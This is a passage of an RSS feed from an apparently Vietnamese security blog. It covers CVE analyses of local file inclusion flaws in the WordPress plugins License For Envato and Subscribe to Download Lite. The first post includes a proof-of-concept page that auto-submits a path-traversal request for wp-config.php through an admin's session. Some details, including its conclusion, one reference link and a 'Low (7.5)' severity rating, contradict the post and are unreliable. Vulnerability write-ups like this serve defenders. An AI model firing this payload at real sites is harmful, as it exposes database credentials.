&amp;amp;&amp;amp; file_exists($template)) {&#xA;            include $template;&#xA;        } else {&#xA;            // Fallback to general.php with the same security checks&#xA;            $general_template = realpath(&amp;#34;{$licenseEnvato_nav_view}/general.php&amp;#34;);&#xA;            if ($general_template &amp;amp;&amp;amp; strpos($general_template, $nav_view_dir) === 0) {&#xA;                include $general_template;&#xA;            }&#xA;        }&#xA;    }&#xA;    ?&amp;gt;&#xA;&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá đã thực hiện nhiều biện pháp để ngăn chặn lỗ hổng &lt;strong&gt;LFI&lt;/strong&gt; và củng cố tính bảo mật của phần xử lý tham số tab:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Sử dụng whitelist &lt;code&gt;$allowed_tabs&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$allowed_tabs = array(&amp;#39;general&amp;#39;, &amp;#39;envato&amp;#39;);&#xA;$allowed_tabs = apply_filters(&amp;#39;license_envato_allowed_tabs&amp;#39;, $allowed_tabs);&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Kiểm tra nonce chống CSRF&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (isset($_GET[&amp;#39;_wpnonce&amp;#39;]) &amp;amp;&amp;amp; wp_verify_nonce(..., &amp;#39;license_envato_switch_tab&amp;#39;))&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Lý do CVE được gán là &lt;strong&gt;Unauthenticated&lt;/strong&gt; là vì kẻ tấn công không cần tài khoản riêng trên site mục tiêu để khai thác. Kỹ thuật phổ biến là lừa một admin (hoặc người có quyền) truy cập trang web chứa payload. Khi admin mở trang đó, trình duyệt sẽ gửi yêu cầu tới site WordPress kèm cookie phiên đang còn hiệu lực - do đó yêu cầu được coi là đã xác thực là từ admin. Nếu plugin nhận và thực thi tham số mà không kiểm tra nonce hoặc quyền truy cập, payload LFI sẽ được xử lý và dẫn tới lỗ hổng.&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Chuẩn hóa và kiểm tra đường dẫn bằng &lt;a href=&#34;https://www.php.net/manual/en/function.realpath.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;realpath()&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$template = realpath(&amp;#34;{$licenseEnvato_nav_view}/{$action}.php&amp;#34;);&#xA;$nav_view_dir = realpath($licenseEnvato_nav_view);&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public function plugin_page() {&#xA;    $license_envato_api = new EnvatoLicenseApiCall();&#xA;    $settingsView = __DIR__ . &amp;#39;/views/settingsView.php&amp;#39;;&#xA;    if ( file_exists( $settingsView ) ) {&#xA;        include $settingsView;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;settingsView.php&lt;/code&gt; luôn tồn tại trong mã nguồn nên chắc chắn được &lt;code&gt;include&lt;/code&gt; trong hàm &lt;code&gt;plugin_page()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function admin_menu() {&#xA;    $parent_slug = &amp;#39;licenseenvato&amp;#39;;&#xA;    $capability = &amp;#39;manage_options&amp;#39;;&#xA;&#xA;    add_submenu_page( $parent_slug, __( &amp;#39;Settings&amp;#39;, &amp;#39;licenseenvato&amp;#39; ), __( &amp;#39;Settings&amp;#39;, &amp;#39;licenseenvato&amp;#39; ), $capability, $parent_slug.&amp;#39;-settings&amp;#39;, [ $this, &amp;#39;settings&amp;#39; ] );&#xA;}&#xA;&#xA;public function settings() {&#xA;    $settings = new Settings();&#xA;    $settings-&amp;gt;plugin_page();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;plugin_page()&lt;/code&gt; được gọi thông qua callback của submenu “Settings”, được đăng ký trong hàm &lt;code&gt;admin_menu()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Submenu này có quyền truy cập &lt;code&gt;manage_options&lt;/code&gt;, nên chỉ hiển thị với admin. Khi admin mở trang con &lt;code&gt;“Settings”&lt;/code&gt; (endpoint &lt;code&gt;licenseenvato-settings&lt;/code&gt;), WordPress sẽ gọi &lt;code&gt;settings()&lt;/code&gt;, từ đó khởi tạo lớp &lt;code&gt;Settings&lt;/code&gt; và chạy &lt;code&gt;plugin_page()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-1&#34;&gt;&lt;span&gt;Step 1&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-1&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Tạo trang web chứa LFI payload&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;&#xA;&amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;&#xA;&amp;lt;head&amp;gt;&#xA;    &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;&#xA;    &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;&#xA;    &amp;lt;title&amp;gt;w41bu1&amp;lt;/title&amp;gt;&#xA;&amp;lt;/head&amp;gt;&#xA;&amp;lt;body&amp;gt;&#xA;    &amp;lt;form action=&amp;#34;http://localhost/wp-admin/admin.php&amp;#34; method=&amp;#34;get&amp;#34;&amp;gt;&#xA;        &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;page&amp;#34; value=&amp;#34;licenseenvato-settings&amp;#34;&amp;gt;&#xA;        &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;tab&amp;#34; value=&amp;#34;../../../../../../wp-config&amp;#34;&amp;gt;&#xA;    &amp;lt;/form&amp;gt;&#xA;    &amp;lt;script&amp;gt;&#xA;        document.forms[0].submit()&#xA;    &amp;lt;/script&amp;gt;&#xA;&amp;lt;/body&amp;gt;&#xA;&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-2&#34;&gt;&lt;span&gt;Step 2&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-2&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Gửi link đến trang web cho admin&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;Debugger đã nhảy đến &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-17-cve-2025-39399/result.png&#34;&#xA;    alt=&#34;Kết quả LFI thành công&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Kết quả LFI thành công&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Phiên bản &lt;strong&gt;≤ 1.0.0&lt;/strong&gt; của License For Envato cho phép LFI vì &lt;code&gt;include()&lt;/code&gt; dùng &lt;code&gt;$atts[&#39;template&#39;]&lt;/code&gt; chưa được xác thực; lỗ hổng đã được vá trong &lt;strong&gt;1.1.0&lt;/strong&gt; bằng &lt;code&gt;basename()&lt;/code&gt; + &lt;code&gt;realpath()&lt;/code&gt; và kiểm tra &lt;code&gt;base_dir&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Việc &lt;strong&gt;chỉ dùng &lt;code&gt;sanitize_text_field()&lt;/code&gt; không đủ&lt;/strong&gt; để ngăn chặn path traversal trong PHP.&lt;/li&gt;&#xA;&lt;li&gt;Mọi tham số được dùng trong &lt;code&gt;include()&lt;/code&gt; hoặc thao tác file &lt;strong&gt;phải được kiểm soát bằng whitelist hoặc &lt;code&gt;realpath()&lt;/code&gt;&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CSRF kết hợp LFI&lt;/strong&gt; có thể biến lỗ hổng dành cho admin thành lỗ hổng &lt;strong&gt;unauthenticated&lt;/strong&gt;, nếu thiếu kiểm tra nonce.&lt;/li&gt;&#xA;&lt;li&gt;Cần &lt;strong&gt;kiểm tra kỹ input và giới hạn phạm vi file có thể truy cập&lt;/strong&gt;, đặc biệt trong các plugin xử lý template hoặc view.&lt;/li&gt;&#xA;&lt;li&gt;Luôn xác thực và ràng buộc đường dẫn khi include file - không bao giờ tin tưởng dữ liệu từ request, dù đã “sanitize”.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;File Inclusion/Path traversal — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/subscribe-to-download-lite/vulnerability/wordpress-subscribe-to-download-lite-plugin-1-2-9-local-file-inclusion-vulnerability?_s_id=cve&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress License For Envato Plugin &amp;lt;= 1.0.0 is vulnerable to Local File Inclusion &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-30782 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-16-cve-2025-30782/</link>
      <pubDate>Thu, 16 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-16-cve-2025-30782/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-16-cve-2025-30782/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Subscribe to Download Lite&lt;/strong&gt; phiên bản &lt;strong&gt;≤ 1.2.9&lt;/strong&gt; chứa lỗ hổng &lt;strong&gt;Local File Inclusion&lt;/strong&gt; cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh &lt;code&gt;include/require&lt;/code&gt;, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-30782&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-30782&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Local File Inclusion&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.2.9&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.3.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (7.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/subscribe-to-download-lite/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Subscribe to Download Lite Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Subscribe to Download Lite&lt;/strong&gt;: &lt;strong&gt;1.2.9&lt;/strong&gt; (vulnerable) và &lt;strong&gt;1.3.0&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Bản lỗi&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;div class=&amp;#34;stdl-form-wrap stdl-&amp;lt;?php echo esc_attr($form_template); ?&amp;gt; 